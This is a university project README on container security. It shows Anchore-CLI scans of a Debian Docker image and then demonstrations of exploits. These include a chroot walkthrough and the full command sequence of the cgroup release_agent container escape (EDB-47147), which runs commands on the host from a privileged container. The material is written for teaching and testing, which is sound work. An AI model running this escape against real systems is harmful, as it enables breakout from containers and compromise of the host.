# Securing_Open_Source_Components_on_Containers
Code for HPE Project  

Team Members:
1. Prishita Ray- 17BCE2405
2. Tanmayi Nandan- 17BCI0039
3. V Bhavyashri Vedula- 17BCI0115
4. Saripella Vivekananda Verma- 17BCI0104  

Mentor:
Prof. K.S.Umadevi

Steps to install Docker on Linux Ubuntu 18.04 is available at the following link:
https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-18-04

Tools that we can use for scanning: Anchore, Clair, Dadga, OpenSCAP, Sysdig Falco
https://opensource.com/article/18/8/tools-container-security 

**Level 1 Report access link:** https://docs.google.com/document/d/1dG2JSPOpljgbQkomYFa5qfXsCrxvhX7X_D0P0upiB2E/edit#heading=h.mbjsiz6n6jlo  

**Level 2 Report access link:**   
https://docs.google.com/document/d/1l2zWXEsoBHJLobd672CToT_eyFsD1ykeHukVMs5Kj4k/edit?usp=sharing

## Vulnerabilities reported by Anchore-Engine using CLI on Docker Debian Image

The Vulnerability Report was obtained using the following procedure:
1. Upgrade Windows 10 Home Edition to Windows 10 Education Edition
2. Install Docker Desktop for Windows and configure
3. Go to the following webpage: [Anchore Docker YAML file](https://docs.anchore.com/current/docs/engine/quickstart/docker-compose.yaml), right-click and save as docker-compose.yaml to your Desktop
4. Start Docker Desktop
5. Open Windows Powershell (Not as admin)
6. Move to your Desktop folder using cd/Desktop
7. Execute the command: 

		docker-compose up -d

8. Install the Command Line Interface (CLI) using 

		pip install anchorecli

9. Type and execute command: 

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 image add docker.io/library/debian:latest

to scan the debian Docker container for vulnerabilities.

10. Next execute: 

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 image wait docker.io/library/debian:latest

Wait for the status to change from Analyzing to Analyzed
11. To get the list of images being scanned for vulnerabilities, execute: 

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 image list

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/image_list.JPG)

12. For image overview and summary information, execute: 

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 image get docker.io/library/debian:latest

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/debian_details.JPG)


13. Finally to get the list of vulnerabilities, run this command: 

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 system feeds list

It will return the following output:

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/vulnerabilities.JPG)

14. Details of CVE vulnerabilities reported are as follows:

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 image vuln docker.io/library/debian:latest os

CVE reports:

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/cve_tags1.JPG)

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/cve_tags2.JPG)

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/cve_tags3.JPG)

15. Image Policy Evaluation:

		anchore-cli --u admin --p foobar --url http://localhost:8228/v1 evaluate check docker.io/library/debian:latest

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/policy.JPG)  

### Security Scanning Report
The report of the CVE violations can be accessed at the following link:
https://docs.google.com/document/d/1DJDDFI02oXyvEloXb_i1AlexnhXto5zzqFN0pwCNz18/edit?usp=sharing

## Exploiting Vulnerabilities on Docker Containers

Samples provided-  
1. Rancher Server: 
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/rancher_server.md  
2. Unprotected TCP socket: 
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/docker_daemon_tcp.md  
3. Apparmor: 
https://github.com/opencontainers/runc/issues/2128  

Other CVE details- https://www.cvedetails.com/vendor/13534/Docker.html

### Exploiting Chroot (Change root) CVE_2015_6240

Reference: https://btholt.github.io/complete-intro-to-containers/chroot

In this vulnerability, a hacker can create his own new root directory, different from the original, or gain access to the directory, for which he previously had write access, from which it is not possible to escape, and hence confidential information can be compromised. The below steps describe how this vulnerability can be exploited by an unauthorized user:  

1. Invoke and run the ubuntu bionic 18.04 docker container from the Windows Powershell by pulling its image from Docker Hub 

		docker run -it --name docker-host --rm --privileged ubuntu:bionic

2. Check the ubuntu version of the container after you are in root

		cat /etc/issue/

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/ubuntu_version.JPG) 

3. Create a new folder for your new root directory from the original

		mkdir /my-new-root                                                                                      

4. Create a new file within the new root directory titled secret.txt

		 echo "my super secret thing" >> /my-new-root/secret.txt                                                                          

5. To ensure that a bash file is present for the new root directory copy it from the original

		cp /bin/bash /bin/ls /my-new-root/bin/                                                                              

Also, add create lib and lib64 directories to bash to contain libraries for x86 and 64 bit systems:

		mkdir /my-new-root/lib /my-new-root/lib64                                                                                

6. To copy the libraries within bash, first list them out:

		ldd /bin/bash                                                                                     

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/bin_bash.JPG)

7. Then copy them to the new root directory /lib and /lib64 

		cp /lib/x86_64-linux-gnu/libtinfo.so.5 /lib/x86_64-linux-gnu/libdl.so.2 /lib/x86_64-linux-gnu/libc.so.6 /my-new-root/lib                                                                         

		cp /lib64/ld-linux-x86-64.so.2 /my-new-root/lib64                                                                                

8. Repeat the same with the files listed in ls

		ldd /bin/ls                 

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/bin_ls.JPG)

		cp /lib/x86_64-linux-gnu/libtinfo.so.5 /lib/x86_64-linux-gnu/libdl.so.2 /lib/x86_64-linux-gnu/libc.so.6 /my-new-root/lib                                                                         

		cp /lib/x86_64-linux-gnu/libpthread.so.0 /my-new-root/lib               

		cp /lib64/ld-linux-x86-64.so.2 /my-new-root/lib64 

9. Change the current root directory by running the command chroot

		chroot /my-new-root bash 

10. To see the contents of the new root directory, use ls. Everything in the original directory can be seen here. But when we try to check the present working directory it shows /, implying that it considers the new root directory as the actual one, instead of the original, and there is no way of navigating back to it, leading to a compromise on authentication and hence, a vulnerability. 

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/jail.JPG)




### Exploiting Chmod (Change mode) EDB-ID:47147

Reference: https://www.exploit-db.com/exploits/47147

#### On the host
	docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
The above command specifies Docker to run with SYS-ADMIN capabilities and with no security ( --security-opt apparmor=unconfined). 
	
![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/docker_sysadmin.PNG)

The SYS_ADMIN capability allows a container to perform the mount syscall. Docker starts containers with a restricted set of capabilities by default and does not enable the SYS_ADMIN capability due to the security risks of doing so.
Further, Docker starts containers with the docker-default AppArmor policy by default, which prevents the use of the mount syscall even when the container is run with SYS_ADMIN.



#### In the container
	mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
To trigger this exploit we need a cgroup where we can create a release_agent file and trigger release_agent invocation by killing all processes in the cgroup. To do that, we create a /tmp/cgrp directory, mount the RDMA cgroup controller and create a child cgroup (named “x”).

	echo 1 > /tmp/cgrp/x/notify_on_release
	host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
	echo "$host_path/cmd" > /tmp/cgrp/release_agent
Next, we enable cgroup notifications on release of the “x” cgroup by writing a 1 to its notify_on_release file. We also set the RDMA cgroup release agent to execute a /cmd script — which we will later create in the container — by writing the /cmd script path on the host to the release_agent file. To do it, we’ll grab the container’s path on the host from the /etc/mtab file.

	echo '#!/bin/sh' > /cmd
	echo "ps aux > $host_path/output" >> /cmd
	chmod a+x /cmd
Now, we create the /cmd script such that it will execute the ps aux command and save its output into /output on the container by specifying the full path of the output file on the host. The chmod command is used to assign execute privilege to everyone. 

	sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"	
Finally, we can execute the attack by spawning a process that immediately ends inside the “x” child cgroup. By creating a /bin/sh process and writing its PID to the cgroup.procs file in “x” child cgroup directory, the script on the host will execute after /bin/sh exits. The output of ps aux performed on the host is then saved to the /output file inside the container.

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/chmod.PNG)

	head /output

![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/chmod_attack.PNG)	

### Privilege Escalation Attack on debian:latest Docker container (CVE 2015-1328)  

As listed in metasploit: linux/local/ntfs3g_priv_esc  

Host/Attacking system OS: Ubuntu bionic 18.04  
Target system OS: Debian 10  


